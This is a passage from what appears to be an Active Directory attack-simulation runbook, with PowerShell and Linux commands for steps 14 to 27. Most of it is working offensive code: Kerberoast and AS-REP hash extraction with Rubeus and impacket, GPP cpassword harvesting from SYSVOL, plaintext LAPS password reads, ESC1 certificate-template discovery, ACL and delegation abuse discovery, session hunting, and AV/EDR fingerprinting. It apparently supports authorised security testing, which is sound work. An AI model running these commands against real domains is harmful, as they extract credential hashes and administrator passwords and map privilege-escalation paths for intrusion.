            Write-Output "TRUST: $($_.SourceName) -> $($_.TargetName) | Dir: $($_.TrustDirection) | Type: $($_.TrustType)"
        }
    } else { Write-Output "TRUST_COUNT: 0" }
} catch {
    Write-Output "WARN: native .NET trust enum failed — trying LDAP"
    # Fallback: DirectorySearcher on trustedDomain objects
    try {
        $de = New-Object System.DirectoryServices.DirectoryEntry(
            "LDAP://<DC_IP>/CN=System,<BASE_DN>", "<USER>@<DOMAIN>", "<PASS>")
        $s  = New-Object System.DirectoryServices.DirectorySearcher($de)
        $s.Filter = "(objectClass=trustedDomain)"
        $s.PropertiesToLoad.AddRange(@("cn","trustDirection","trustType","trustAttributes","flatName"))
        $s.FindAll() | ForEach-Object {
            $dir = switch ([int]$_.Properties['trustdirection'][0]) {
                1 {"Inbound"} 2 {"Outbound"} 3 {"Bidirectional"} default {"Unknown"}
            }
            Write-Output "TRUST: $($_.Properties['cn'][0]) | $dir"
        }
    } catch { Write-Output "ERROR: step14 all methods failed" }
} | Tee-Object C:\Windows\Temp\bas\trusts.txt
```

```bash
# Linux
{
ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -b "CN=System,<BASE_DN>" "(objectClass=trustedDomain)" \
    cn trustDirection trustType trustAttributes flatName 2>/dev/null || \
echo "ERROR: step14 trust mapping failed"
} 2>&1 | tee <ARTIFACTS>/trusts.txt
```

---

### Step 15 — ACL abuse discovery (D2)

```powershell
# Windows — read DACL on domain root object
try {
    $de = New-Object System.DirectoryServices.DirectoryEntry(
        "LDAP://<DC_IP>/<BASE_DN>", "<USER>@<DOMAIN>", "<PASS>")
    $de.Options.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
    $de.RefreshCache([string[]]@("nTSecurityDescriptor"))
    $de.ObjectSecurity.Access | Where-Object {
        $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|ExtendedRight" -and
        $_.IdentityReference -notmatch "SYSTEM|Domain Admins|Enterprise Admins|Administrators|BUILTIN|Creator|SELF"
    } | Select-Object IdentityReference, ActiveDirectoryRights, ObjectType |
        Export-Csv C:\Windows\Temp\bas\acl_abuse.csv -NoTypeInformation
    Write-Output "ACL_EXPORT: C:\Windows\Temp\bas\acl_abuse.csv"
} catch {
    Write-Output "WARN: step15 DirectoryEntry DACL failed — $($_.Exception.Message)"
    # Fallback: anonymous read attempt
    try {
        $de2 = New-Object System.DirectoryServices.DirectoryEntry("LDAP://<DC_IP>/<BASE_DN>")
        $de2.Options.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
        $de2.RefreshCache([string[]]@("nTSecurityDescriptor"))
        Write-Output "ACL_ANON_READ: success"
    } catch { Write-Output "ERROR: step15 DACL read completely failed" }
} | Tee-Object C:\Windows\Temp\bas\acl_abuse.txt
```

```bash
# Linux — daclenum.py primary (reads LDAP), ldapsearch fallback
{
daclenum.py -u <USER> -p '<PASS>' -d <DOMAIN> <DC_IP> 2>/dev/null \
|| ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -b "<BASE_DN>" "(objectClass=domain)" nTSecurityDescriptor 2>/dev/null \
|| echo "ERROR: step15 ACL enumeration failed"
} 2>&1 | tee <ARTIFACTS>/acl_abuse.txt
```

---

### Step 16 — Kerberoast and AS-REP discovery (D9)

```powershell
# Windows — DirectorySearcher for enumeration, Rubeus for hashes
try {
    $de = New-Object System.DirectoryServices.DirectoryEntry(
        "LDAP://<DC_IP>/<BASE_DN>", "<USER>@<DOMAIN>", "<PASS>")
    $s  = New-Object System.DirectoryServices.DirectorySearcher($de)
    $s.PageSize = 1000

    # Kerberoastable
    $s.Filter = "(&(objectClass=user)(servicePrincipalName=*)" +
                "(!(samAccountName=krbtgt))" +
                "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    $s.PropertiesToLoad.Clear()
    $s.PropertiesToLoad.AddRange(@("samaccountname","servicePrincipalName","adminCount"))
    $kerb = $s.FindAll()
    Write-Output "KERBEROAST_COUNT: $($kerb.Count)"
    $kerb | ForEach-Object {
        Write-Output "KERBEROAST: $($_.Properties['samaccountname'][0]) | SPN: $($_.Properties['serviceprincipalname'] -join ',') | ADMIN: $($_.Properties['admincount'][0])"
    }
    $kerb.Dispose()

    # AS-REP roastable
    $s.Filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
    $s.PropertiesToLoad.Clear()
    $s.PropertiesToLoad.Add("samaccountname") | Out-Null
    $asrep = $s.FindAll()
    Write-Output "ASREP_COUNT: $($asrep.Count)"
    $asrep | ForEach-Object { Write-Output "ASREP: $($_.Properties['samaccountname'][0])" }
    $asrep.Dispose()

} catch {
    Write-Output "ERROR: step16_enum $($_.Exception.Message)"
} | Tee-Object C:\Windows\Temp\bas\kerberoastable.txt

# Hash extraction — Rubeus (no native equivalent)
try {
    Rubeus.exe kerberoast /outfile:C:\Windows\Temp\bas\kerb_hashes.txt /nowrap 2>&1
} catch { Write-Output "WARN: Rubeus not available — run from Linux with impacket" }
```

```bash
# Linux
{
# Kerberoastable
ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -b "<BASE_DN>" \
    "(&(objectClass=user)(servicePrincipalName=*)(!(samAccountName=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
    samAccountName servicePrincipalName adminCount 2>/dev/null

# AS-REP roastable
ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -b "<BASE_DN>" \
    "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
    samAccountName 2>/dev/null

} 2>&1 | tee <ARTIFACTS>/kerberoastable.txt

# Hash extraction
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> \
    -outputfile <ARTIFACTS>/kerb_hashes.txt 2>/dev/null || \
echo "WARN: impacket-GetUserSPNs failed"

impacket-GetNPUsers '<DOMAIN>/' \
    -usersfile <ARTIFACTS>/users.txt \
    -no-pass -format hashcat \
    -outputfile <ARTIFACTS>/asrep_hashes.txt 2>/dev/null || \
echo "WARN: impacket-GetNPUsers failed"
```

---

### Step 17 — Delegation discovery (D16)

```powershell
# Windows — DirectorySearcher, three delegation types
try {
    $de = New-Object System.DirectoryServices.DirectoryEntry(
        "LDAP://<DC_IP>/<BASE_DN>", "<USER>@<DOMAIN>", "<PASS>")
    $s  = New-Object System.DirectoryServices.DirectorySearcher($de)
    $s.PageSize = 1000

    # Unconstrained (exclude DCs — they always have this flag)
    $s.Filter = "(&(objectCategory=computer)" +
                "(userAccountControl:1.2.840.113556.1.4.803:=524288)" +
                "(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))"
    $s.PropertiesToLoad.Clear()
    $s.PropertiesToLoad.AddRange(@("name","dNSHostName","operatingSystem"))
    $unc = $s.FindAll()
    Write-Output "UNCONSTRAINED_COUNT: $($unc.Count)"
    $unc | ForEach-Object { Write-Output "UNCONSTRAINED: $($_.Properties['dnshostname'][0])" }
    $unc.Dispose()

    # Constrained
    $s.Filter = "(msDS-AllowedToDelegateTo=*)"
    $s.PropertiesToLoad.Clear()
    $s.PropertiesToLoad.AddRange(@("name","msDS-AllowedToDelegateTo"))
    $con = $s.FindAll()
    Write-Output "CONSTRAINED_COUNT: $($con.Count)"
    $con | ForEach-Object {
        Write-Output "CONSTRAINED: $($_.Properties['name'][0]) -> $($_.Properties['msds-allowedtodelegateto'] -join ',')"
    }
    $con.Dispose()

    # RBCD
    $s.Filter = "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
    $s.PropertiesToLoad.Clear()
    $s.PropertiesToLoad.Add("name") | Out-Null
    $rbcd = $s.FindAll()
    Write-Output "RBCD_COUNT: $($rbcd.Count)"
    $rbcd | ForEach-Object { Write-Output "RBCD: $($_.Properties['name'][0])" }
    $rbcd.Dispose()

} catch {
    Write-Output "ERROR: step17 $($_.Exception.Message)"
} | Tee-Object C:\Windows\Temp\bas\delegation.txt
```

```bash
# Linux
{
ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' -b "<BASE_DN>" \
    "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))" \
    name dNSHostName 2>/dev/null | grep -E "^name:|^dNSHostName:"

ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' -b "<BASE_DN>" \
    "(msDS-AllowedToDelegateTo=*)" name msDS-AllowedToDelegateTo 2>/dev/null

ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' -b "<BASE_DN>" \
    "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" name 2>/dev/null

} 2>&1 | tee <ARTIFACTS>/delegation.txt
```

---

### Step 18 — GPO enumeration (D10)

```powershell
# Windows
try {
    $de = New-Object System.DirectoryServices.DirectoryEntry(
        "LDAP://<DC_IP>/CN=Policies,CN=System,<BASE_DN>",
        "<USER>@<DOMAIN>", "<PASS>")
    $s  = New-Object System.DirectoryServices.DirectorySearcher($de)
    $s.Filter = "(objectClass=groupPolicyContainer)"
    $s.PropertiesToLoad.AddRange(@("displayName","cn","gPCFileSysPath","versionNumber"))
    $gpos = $s.FindAll()
    Write-Output "GPO_COUNT: $($gpos.Count)"
    $gpos | ForEach-Object {
        Write-Output "GPO: $($_.Properties['displayname'][0]) | PATH: $($_.Properties['gpcfilesyspath'][0])"
    }
    $gpos.Dispose()
} catch { Write-Output "ERROR: step18_gpo $($_.Exception.Message)" }

# SYSVOL GPP cpassword — native findstr, always accessible
try {
    $found = findstr /S /I cpassword "\\<DOMAIN>\sysvol\<DOMAIN>\Policies\*.xml" 2>&1
    if ($found) {
        Write-Output "GPP_CPASSWORD_FOUND: true"
        $found | Out-File C:\Windows\Temp\bas\gpp_cpassword.txt
    } else { Write-Output "GPP_CPASSWORD_FOUND: false" }
} catch { Write-Output "WARN: step18_sysvol findstr failed" } |
    Tee-Object C:\Windows\Temp\bas\gpos.txt
```

```bash
# Linux
{
ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -b "CN=Policies,CN=System,<BASE_DN>" \
    "(objectClass=groupPolicyContainer)" displayName cn gPCFileSysPath 2>/dev/null || \
echo "ERROR: step18 GPO ldapsearch failed"

# SYSVOL GPP
smbclient //<DC_IP>/SYSVOL -U "<USER>%<PASS>" \
    -c "recurse on; prompt off; mget *.xml" 2>/dev/null
grep -r "cpassword" . 2>/dev/null | head -20
} 2>&1 | tee <ARTIFACTS>/gpos.txt
```

---

### Step 19 — AD CS vulnerability discovery (D3)

```powershell
# Windows — LDAP template enumeration (no Certify needed for discovery)
try {
    $pkiBase = "CN=Public Key Services,CN=Services,CN=Configuration,<BASE_DN>"
    $de = New-Object System.DirectoryServices.DirectoryEntry(
        "LDAP://<DC_IP>/$pkiBase", "<USER>@<DOMAIN>", "<PASS>")
    $s  = New-Object System.DirectoryServices.DirectorySearcher($de)
    $s.Filter = "(objectClass=pKICertificateTemplate)"
    $s.PropertiesToLoad.AddRange(@("cn","msPKI-Certificate-Name-Flag",
        "msPKI-Enrollment-Flag","pKIExtendedKeyUsage","msPKI-RA-Signature"))
    $templates = $s.FindAll()
    Write-Output "TEMPLATE_COUNT: $($templates.Count)"
    $templates | ForEach-Object {
        $nf   = [int]($_.Properties['mspki-certificate-name-flag'][0])
        $ef   = [int]($_.Properties['mspki-enrollment-flag'][0])
        $esc1 = ($nf -band 1) -ne 0  # ENROLLEE_SUPPLIES_SUBJECT
        $esc2 = ($ef -band 0x10) -eq 0  # No manager approval
        $cn   = $_.Properties['cn'][0]
        Write-Output "TEMPLATE: $cn | ESC1_CANDIDATE: $($esc1 -and $esc2) | NAMEFLAG: $nf | ENROLLFLAG: $ef"
    }
    $templates.Dispose()
} catch {
    Write-Output "WARN: step19 LDAP template enum failed — $($_.Exception.Message)"
    # Fallback: Certify if available
    try {
        Certify.exe find /vulnerable 2>&1 |
            Tee-Object C:\Windows\Temp\bas\adcs_certify.txt
    } catch { Write-Output "ERROR: step19 Certify not available" }
} | Tee-Object C:\Windows\Temp\bas\adcs.txt

# Web enrollment check
try {
    $r = (New-Object System.Net.WebClient).DownloadString("http://<DC_IP>/certsrv/") 2>&1
    Write-Output "WEB_ENROLLMENT: $($r -match 'Active Directory')"
} catch { Write-Output "WEB_ENROLLMENT: not_detected" }
```

```bash
# Linux — certipy primary, ldapsearch fallback
{
certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> \
    -output <ARTIFACTS>/adcs -vulnerable -enabled 2>/dev/null \
|| ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,<BASE_DN>" \
    "(objectClass=pKICertificateTemplate)" \
    cn msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag 2>/dev/null \
|| echo "ERROR: step19 AD CS enumeration failed"

curl -sk http://<DC_IP>/certsrv/ 2>/dev/null | grep -i "Active Directory" && \
    echo "WEB_ENROLLMENT: true" || echo "WEB_ENROLLMENT: not_detected"
} 2>&1 | tee <ARTIFACTS>/adcs.txt
```

---

### Step 20 — SMB share enumeration (D4)

```powershell
# Windows — native commands primary
try {
    # List shares on all live hosts
    Get-Content C:\Windows\Temp\bas\live_hosts.txt -ErrorAction Stop |
        ForEach-Object {
            Write-Output "=== $_ ==="
            net view \\$_ 2>&1
        }
} catch { Write-Output "WARN: step20 net view failed — $($_.Exception.Message)" }

# SYSVOL always accessible on domain members
try {
    Get-ChildItem "\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies" -Recurse -ErrorAction SilentlyContinue |
        Select-String -Pattern "cpassword" |
        Select-Object Path, Line |
        Export-Csv C:\Windows\Temp\bas\sysvol_creds.csv -NoTypeInformation
    findstr /S /I cpassword "\\<DOMAIN>\sysvol\<DOMAIN>\Policies\*.xml" 2>&1
} catch { Write-Output "WARN: step20 SYSVOL scan failed" } |
    Tee-Object C:\Windows\Temp\bas\shares.txt
```

```bash
# Linux
{
smbclient -L //<DC_IP> -U "<USER>%<PASS>" 2>/dev/null || \
netexec smb <LIVE_HOSTS_FILE> -u <USER> -p '<PASS>' --shares 2>/dev/null || \
echo "ERROR: step20 share enum failed"

# SYSVOL GPP
smbclient //<DC_IP>/SYSVOL -U "<USER>%<PASS>" \
    -c "recurse on; prompt off; ls" 2>/dev/null
} 2>&1 | tee <ARTIFACTS>/shares.txt
```

---

### Step 21 — Session hunting (D5)

```powershell
# Windows — native first
try { query user /server:<DC_HOSTNAME> 2>&1 }
catch { Write-Output "WARN: query user failed" }

try {
    Get-Content C:\Windows\Temp\bas\live_hosts.txt -ErrorAction Stop |
        ForEach-Object {
            $u = (Get-WmiObject Win32_ComputerSystem -ComputerName $_ `
                -ErrorAction SilentlyContinue).UserName
            if ($u) { Write-Output "SESSION: $_ — $u" }
        }
} catch { Write-Output "WARN: WMI session query failed" }

# LDAP — DA members list
try {
    $de = New-Object System.DirectoryServices.DirectoryEntry(
        "LDAP://<DC_IP>/<BASE_DN>", "<USER>@<DOMAIN>", "<PASS>")
    $s  = New-Object System.DirectoryServices.DirectorySearcher($de)
    $s.Filter = "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,<BASE_DN>))"
    $s.PropertiesToLoad.Add("samaccountname") | Out-Null
    $s.FindAll() | ForEach-Object {
        Write-Output "DA_MEMBER: $($_.Properties['samaccountname'][0])"
    }
} catch { Write-Output "ERROR: step21 DA member lookup failed" } |
    Tee-Object C:\Windows\Temp\bas\sessions.txt
```

```bash
# Linux
{
netexec smb <LIVE_HOSTS_FILE> -u <USER> -p '<PASS>' \
    --loggedon-users 2>/dev/null \
|| echo "WARN: netexec session query failed"

ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -b "<BASE_DN>" \
    "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,<BASE_DN>))" \
    samAccountName 2>/dev/null || echo "WARN: DA member ldapsearch failed"
} 2>&1 | tee <ARTIFACTS>/sessions.txt
```

---

### Step 22 — Process and AV/EDR discovery (D12)

```powershell
# Windows — all native, no binary drop
try {
    whoami /all 2>&1
    whoami /priv 2>&1
    systeminfo 2>&1 | findstr /B /C:"OS Name" /C:"OS Version" /C:"Domain"
    net localgroup administrators 2>&1
    netstat -ano 2>&1 | findstr LISTENING
    sc query type= all state= all 2>&1 |
        findstr /i "defender crowdstrike carbon sentinel cylance cortex sysmon"
} catch { Write-Output "WARN: step22 basic info failed" }

try {
    Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct `
        -ErrorAction SilentlyContinue |
        Select-Object displayName, productState |
        ForEach-Object { Write-Output "AV: $($_.displayName) | STATE: $($_.productState)" }
} catch { Write-Output "WARN: WMI AV query failed" }

try {
    Get-MpComputerStatus -ErrorAction SilentlyContinue |
        Select-Object RealTimeProtectionEnabled, AMServiceEnabled |
        ForEach-Object {
            Write-Output "DEFENDER_RTP: $($_.RealTimeProtectionEnabled)"
            Write-Output "DEFENDER_AM: $($_.AMServiceEnabled)"
        }
} catch { Write-Output "WARN: Get-MpComputerStatus not available" }

try {
    Get-Process -ErrorAction SilentlyContinue |
        Select-Object Name, Id, CPU, WorkingSet |
        Export-Csv C:\Windows\Temp\bas\processes.csv -NoTypeInformation
    Write-Output "PROCESS_CSV: C:\Windows\Temp\bas\processes.csv"
} catch { Write-Output "WARN: Get-Process failed" }

try {
    Get-Service -ErrorAction SilentlyContinue |
        Where-Object { $_.Status -eq 'Running' } |
        Select-Object Name, DisplayName |
        Export-Csv C:\Windows\Temp\bas\services_running.csv -NoTypeInformation
} catch { Write-Output "WARN: Get-Service failed" } |
    Tee-Object C:\Windows\Temp\bas\step22.txt
```

---

### Step 23 — Azure AD / hybrid (D14)

```powershell
# Windows — check for hybrid indicators first
try {
    $adSync = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\AD Sync" -ErrorAction SilentlyContinue
    if ($adSync) { Write-Output "AZURE_AD_CONNECT: detected | Path: $($adSync.InstallPath)" }
    $svc = Get-Service "ADSync" -ErrorAction SilentlyContinue
    if ($svc) { Write-Output "ADSYNCSVC: $($svc.Status)" }
} catch { Write-Output "WARN: step23 ADSync check failed" }

try {
    $de = New-Object System.DirectoryServices.DirectoryEntry(
        "LDAP://<DC_IP>/<BASE_DN>", "<USER>@<DOMAIN>", "<PASS>")
    $s  = New-Object System.DirectoryServices.DirectorySearcher($de)
    $s.Filter = "(objectClass=msDS-DeviceContainer)"
    $r = $s.FindAll()
    Write-Output "HYBRID_DEVICE_CONTAINER: $($r.Count -gt 0)"
    $r.Dispose()
} catch { Write-Output "WARN: step23 hybrid LDAP check failed" } |
    Tee-Object C:\Windows\Temp\bas\azure.txt
```

```bash
# Linux
{
roadrecon gather -u <USER>@<DOMAIN> -p '<PASS>' \
    -d <ARTIFACTS>/roadtools.db 2>/dev/null && \
roadrecon dump -d <ARTIFACTS>/roadtools.db 2>/dev/null \
|| ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -b "CN=Configuration,<BASE_DN>" \
    "(objectClass=msDS-DeviceContainer)" dn 2>/dev/null \
|| echo "WARN: step23 Azure/hybrid check failed"
} 2>&1 | tee <ARTIFACTS>/azure.txt
```

---

### Step 24 — LAPS and gMSA (D20)

```powershell
# Windows — DirectorySearcher for ms-Mcs-AdmPwd
try {
    $de = New-Object System.DirectoryServices.DirectoryEntry(
        "LDAP://<DC_IP>/<BASE_DN>", "<USER>@<DOMAIN>", "<PASS>")
    $s  = New-Object System.DirectoryServices.DirectorySearcher($de)

    # LAPS
    $s.Filter = "(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))"
    $s.PropertiesToLoad.AddRange(@("name","ms-Mcs-AdmPwd","ms-Mcs-AdmPwdExpirationTime"))
    $laps = $s.FindAll()
    Write-Output "LAPS_READABLE_COUNT: $($laps.Count)"
    $laps | ForEach-Object {
        Write-Output "LAPS: $($_.Properties['name'][0]) | PWD: $($_.Properties['ms-mcs-admpwd'][0])"
    }
    $laps.Dispose()

    # gMSA
    $s.Filter = "(objectClass=msDS-GroupManagedServiceAccount)"
    $s.PropertiesToLoad.Clear()
    $s.PropertiesToLoad.AddRange(@("samaccountname","msDS-GroupMSAMembership"))
    $gmsa = $s.FindAll()
    Write-Output "GMSA_COUNT: $($gmsa.Count)"
    $gmsa | ForEach-Object { Write-Output "GMSA: $($_.Properties['samaccountname'][0])" }
    $gmsa.Dispose()

} catch {
    Write-Output "WARN: step24 DirectorySearcher failed — $($_.Exception.Message)"
    # Fallback: netexec ldap
    try { netexec ldap <DC_IP> -u <USER> -p '<PASS>' -M laps 2>&1 }
    catch { Write-Output "ERROR: step24 all methods failed" }
} | Tee-Object C:\Windows\Temp\bas\laps.txt
```

```bash
# Linux
{
ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -b "<BASE_DN>" "(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))" \
    name ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime 2>/dev/null \
|| netexec ldap <DC_IP> -u <USER> -p '<PASS>' -M laps 2>/dev/null \
|| echo "WARN: step24 LAPS query failed"

ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -b "<BASE_DN>" "(objectClass=msDS-GroupManagedServiceAccount)" \
    samAccountName 2>/dev/null || echo "WARN: step24 gMSA query failed"
} 2>&1 | tee <ARTIFACTS>/laps.txt
```

---

### Step 25 — MSSQL (D17)

Only if TCP/1433 found in Step 5.

```powershell
# Windows — native SqlClient
try {
    $conn = New-Object System.Data.SqlClient.SqlConnection(
        "Server=<MSSQL_HOST>;Integrated Security=True;Connect Timeout=5;")
    $conn.Open()
    $cmd = $conn.CreateCommand()
    $cmd.CommandText = "SELECT @@VERSION, @@SERVERNAME, SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')"
    $r = $cmd.ExecuteReader()
    while ($r.Read()) {
        Write-Output "MSSQL_VERSION: $($r[0])"
        Write-Output "MSSQL_SERVER: $($r[1])"
        Write-Output "MSSQL_USER: $($r[2])"
        Write-Output "MSSQL_SYSADMIN: $($r[3])"
    }
    $conn.Close()
} catch {
    Write-Output "WARN: step25 native SQL failed — $($_.Exception.Message)"
    try { netexec mssql <MSSQL_HOST> -u <USER> -p '<PASS>' 2>&1 }
    catch { Write-Output "ERROR: step25 all methods failed" }
} | Tee-Object C:\Windows\Temp\bas\mssql.txt
```

```bash
netexec mssql <MSSQL_HOST> -u <USER> -p '<PASS>' \
    -q "SELECT @@VERSION" 2>/dev/null || \
echo "ERROR: step25 MSSQL enum failed" | tee <ARTIFACTS>/mssql.txt
```

---

### Step 26 — Exchange (D18)

Only if OWA / TCP/25 / TCP/587 found in Step 5.

```powershell
try {
    $r = Invoke-WebRequest -Uri "https://<EXCHANGE_HOST>/owa" `
        -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue
    Write-Output "OWA_STATUS: $($r.StatusCode)"
} catch { Write-Output "OWA_STATUS: unreachable" }

try {
    $de = New-Object System.DirectoryServices.DirectoryEntry(
        "LDAP://<DC_IP>/CN=Microsoft Exchange,CN=Services,CN=Configuration,<BASE_DN>",
        "<USER>@<DOMAIN>", "<PASS>")
    $s  = New-Object System.DirectoryServices.DirectorySearcher($de)
    $s.Filter = "(objectClass=msExchOrganizationContainer)"
    $s.PropertiesToLoad.Add("name") | Out-Null
    $s.FindAll() | ForEach-Object {
        Write-Output "EXCHANGE_ORG: $($_.Properties['name'][0])"
    }
} catch { Write-Output "WARN: step26 Exchange LDAP failed" } |
    Tee-Object C:\Windows\Temp\bas\exchange.txt
```

```bash
{
curl -sk https://<EXCHANGE_HOST>/owa 2>/dev/null | grep -i "Microsoft" && \
    echo "OWA: detected" || echo "OWA: not detected"
netexec smb <EXCHANGE_HOST> -u <USER> -p '<PASS>' \
    -M spider_plus 2>/dev/null || echo "WARN: step26 Exchange enum failed"
} 2>&1 | tee <ARTIFACTS>/exchange.txt
```

---

### Step 27 — Printer and spooler (D19)

Only if TCP/445 + TCP/135 on non-DC hosts.

```powershell
# Windows — WMI spooler check
try {
    Get-Content C:\Windows\Temp\bas\live_hosts.txt -ErrorAction Stop |
        ForEach-Object {
            try {
                $svc = Get-WmiObject Win32_Service -ComputerName $_ `
                    -Filter "Name='Spooler'" -ErrorAction SilentlyContinue
                if ($svc -and $svc.State -eq 'Running') {
                    Write-Output "SPOOLER_RUNNING: $_"
                }
            } catch { Write-Output "WARN: WMI spooler check failed for $_" }
        }
} catch { Write-Output "ERROR: step27 no live hosts file" } |
    Tee-Object C:\Windows\Temp\bas\spooler.txt
```

```bash
netexec smb <LIVE_HOSTS_FILE> -u <USER> -p '<PASS>' \
    -M spooler 2>/dev/null || \
echo "ERROR: step27 spooler check failed" | tee <ARTIFACTS>/spooler.txt
```
